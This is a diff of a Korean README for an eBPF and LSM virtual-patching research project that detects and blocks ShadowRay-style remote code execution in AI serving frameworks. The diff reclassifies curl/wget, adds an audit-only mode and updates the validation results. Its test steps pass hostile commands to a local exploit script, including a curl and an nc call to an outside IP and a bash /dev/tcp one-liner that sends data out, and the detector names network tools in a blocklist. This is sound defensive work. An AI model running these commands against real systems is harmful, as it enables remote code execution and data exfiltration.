@@ -7,8 +7,10 @@ eBPF 기반 AI 서빙 프레임워크 취약점 가상 패치(Virtual Patching) 
 AI 서빙 프레임워크(Ray, vLLM, Triton 등)에서 발견되는 원격 코드 실행(RCE) 취약점은 벤더 패치가 지연되거나(예: CVE-2023-48022, "ShadowRay"), 조직 내부적으로 업그레이드가 늦어지는 경우가 많다. 본 프로젝트는 eBPF를 이용해 애플리케이션 코드를 수정하지 않고, 알려진 취약점의 악용 시 발생하는 비정상 행위를 커널 수준에서 탐지·차단하는 가상 패치 메커니즘을 연구한다.
 
 두 계층으로 탐지한다.
-- **SHADOW_EXEC**: AI 워커 계보가 curl/wget/nc 등 의심 바이너리를 실행하는 순간 탐지
-- **SHADOW_CONNECT**: AI 워커 계보가 신뢰되지 않은 목적지로 `connect()`를 시도하는 순간 탐지 — bash `/dev/tcp/`처럼 별도 바이너리를 실행하지 않는 우회도 바이너리 종류와 무관하게 포착
+- **SHADOW_EXEC**: AI 워커 계보가 nc/ncat 등 합법적 용도가 사실상 없는 바이너리를 실행하는 순간 탐지. curl/wget은 모델·데이터셋 다운로드 등 정당한 용도가 있는 이중 용도(dual-use) 도구라 여기서 판단하지 않고 아래 SHADOW_CONNECT에 맡긴다(v4 재검토, `paper_draft.md` 3.6절).
+- **SHADOW_CONNECT**: AI 워커 계보가 신뢰되지 않은 목적지로 `connect()`를 시도하는 순간 탐지 — bash `/dev/tcp/`처럼 별도 바이너리를 실행하지 않는 우회도, curl/wget도 바이너리 종류와 무관하게 목적지 기준으로 포착
+
+신규 룰을 먼저 "탐지만, 차단은 안 함"으로 배포하고 오탐을 관찰한 뒤 실제 차단으로 전환할 수 있도록, `--audit-only` 플래그(재컴파일 불필요)를 두 컴포넌트 모두에 지원한다(v5, `paper_draft.md` 3.6절).
 
 둘 다 "행위 발생 후 SIGKILL"이라는 공통 한계가 있어, 이를 보완하는 **3번째 계층**을 추가로 제공한다(기능 검증 완료, 아래 "LSM 기반 사전 차단" 절 참고).
 - **LSM 사전 차단**(`kshield_vpatch_lsm`): `security_bprm_check_security`/`security_socket_connect` LSM 훅에서 동기적으로 `-EPERM`을 반환하여 execve()/connect() 자체를 실패시킨다. SIGKILL과 달리 "죽이기 전에 막기"이며, VM 실측으로 확인하였다. `CONFIG_BPF_LSM` 및 부팅 파라미터(`lsm=...,bpf`) 의존성이 있다.
@@ -34,7 +36,7 @@ kShield-VirtualPatch/
 ├── src/
 │   ├── kshield_vpatch.bpf.c      커널 공간 BPF 프로그램 (SHADOW_EXEC + SHADOW_CONNECT)
 │   ├── kshield_vpatch.c          사용자 공간 로더/로거
-│   ├── kshield_vpatch_lsm.bpf.c  (실험적) LSM 훅 기반 동기적 사전 차단, 검증 대기
+│   ├── kshield_vpatch_lsm.bpf.c  LSM 훅 기반 동기적 사전 차단, 기능·성능 검증 완료
 │   ├── kshield_vpatch_lsm.c      (실험적) 위 컴포넌트의 사용자 공간 로더
 │   └── Makefile
 └── attack/
@@ -59,12 +61,19 @@ sudo ./src/kshield_vpatch
 # 3) (다른 터미널) 정상 job — 오탐 없어야 함
 python3 attack/exploit_shadowray.py --cmd "echo benign-job"
 
-# 4) 알려진 바이너리로 공격 — SHADOW_EXEC가 curl exec 시점에 차단해야 함
+# 4) 신뢰 안 된 목적지로 curl — SHADOW_CONNECT가 connect() 시점에 차단해야 함
+#    (curl/wget은 exec 시점(SHADOW_EXEC)이 아닌 connect 시점에 목적지로 판단한다 — v4 재검토)
 python3 attack/exploit_shadowray.py --cmd "curl http://1.1.1.1/"
+
+# 4-b) nc 실행 — SHADOW_EXEC가 exec 시점에 즉시 차단해야 함 (합법적 용도가 없는 바이너리)
+python3 attack/exploit_shadowray.py --cmd "nc 1.1.1.1 80"
 
 # 5) 블록리스트 우회 시도 — SHADOW_CONNECT가 connect() 시점에 차단해야 함
 #    (bash 내장 기능이라 curl/nc를 exec하지 않음)
 python3 attack/exploit_shadowray.py --cmd "bash -c 'exec 3<>/dev/tcp/1.1.1.1/80; echo leaked >&3'"
+
+# 5-b) --audit-only 모드: 탐지 로그만 남기고 차단은 안 함 (재컴파일 불필요)
+sudo ./src/kshield_vpatch --audit-only
 
 # 6) (나중에, 실험 단계) 성능 오버헤드 측정
 python3 attack/benchmark_vpatch.py --count 500 --output metrics_vpatch_on.csv
@@ -76,19 +85,22 @@ python3 attack/benchmark_vpatch.py --count 500 --output metrics_vpatch_on.csv
 
 ## 상태
 
-**PoC 검증 완료 (v3, kprobe/tracepoint 기반).** LSM 기반 사전 차단도 기능
-검증 완료 — 아래 별도 절 참고. 성능 오버헤드 측정만 아직 미수행.
+**v3(kprobe/tracepoint) + LSM 사전 차단 모두 기능·성능 검증 완료.** v4(curl/wget
+재분류)·v5(audit-only 모드)까지 VM에서 검증하였다. 상세 수치는
+`paper_draft.md` 4.4절·3.6절 참고.
 
 VM 실측(Ubuntu, 실제 curl/bash 사용)으로 다음을 확인하였다.
-- 빌드: 컴파일·CO-RE 재배치·attach 모두 에러 없이 성공
-- 정상 job(`echo`, `python3 -c ...`) → 오탐 없이 통과
-- 알려진 바이너리 공격(python3 → sh → curl 2단계 체인) → curl exec 시점에
-  SHADOW_EXEC로 정확히 차단
-- **블록리스트 우회(bash `/dev/tcp/`, curl/nc 미실행)** → SHADOW_CONNECT가
-  `tcp_v4_connect` 시점에 바이너리 종류와 무관하게 차단
-- 성능(N=10, Welch's t-test): SHADOW_EXEC 활성화로 인한 유의미한 처리량·지연
-  변화 없음(처리량 p=0.7322, 지연 p=0.6956) — SHADOW_CONNECT 포함 재측정은
-  향후 과제
+- 빌드: 컴파일·CO-RE 재배치·attach(v3: kprobe/tracepoint, LSM:
+  `attach_type lsm_mac`) 모두 에러 없이 성공
+- 정상 job(`echo`, `python3 -c ...`, curl로 신뢰 목적지 다운로드) → 오탐 없이 통과
+- 공격 체인(python3 → sh → curl, bash `/dev/tcp/` 우회) → curl/wget은
+  connect 계층(SHADOW_CONNECT/LSM `socket_connect`)에서, nc/ncat은 exec
+  계층(SHADOW_EXEC/LSM `bprm_check_security`)에서 각각 정확히 차단
+- 성능(off/v3/v3+LSM 3개 그룹, N=10, Welch's t-test): fork 단계가 얕은
+  워크로드에서는 유의미한 차이 없음. fork 집약적 워크로드에서는 처음으로
+  통계적으로 유의미하지만 작은 차이(처리량 −0.67%, 지연시간 +0.7%) 관측
+- audit-only 모드: 탐지 로그는 남기되 실제 차단(SIGKILL/-EPERM)은 건너뛰는
+  동작을 v3·LSM 양쪽에서 확인
 
 `paper_draft.md`에 위 결과가 전부 반영되어 있다.
 
@@ -109,7 +121,7 @@ permitted`)로 확인. 실측 중 `suspicious_bins[]`가 `/usr/bin/curl`은 막�
 놓치는 버그를 발견하여 `kshield_vpatch.bpf.c`(v3)와 `kshield_vpatch_lsm.bpf.c`
 양쪽에서 수정하였다 — 수정 전에도 SHADOW_CONNECT/socket_connect 계층이
 실제 연결 시도를 막아 데이터 유출은 없었다(defense-in-depth 실증).
-성능 오버헤드 측정은 아직 미수행.
+성능 오버헤드는 4.4절(off/v3/v3+LSM 3개 그룹)에서 측정 완료하였다.
 
 ```bash
 # 0) 사전 확인 — 둘 다 충족해야 attach가 성공한다
